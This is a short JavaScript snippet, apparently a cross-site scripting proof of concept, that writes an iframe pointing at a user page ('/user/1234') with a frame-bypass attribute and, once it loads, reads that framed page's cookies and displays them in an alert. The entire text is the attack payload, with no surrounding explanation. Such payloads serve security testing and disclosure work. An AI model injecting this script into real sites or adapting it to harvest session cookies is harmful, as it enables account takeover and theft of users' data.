function bru() {
 var cookies = document.getElementById('f').contentDocument.cookie;
 alert(cookies);
};
document.write('<iframe id="f" is="x-frame-bypass" onload="bru()" src="/user/1234" ></iframe>');
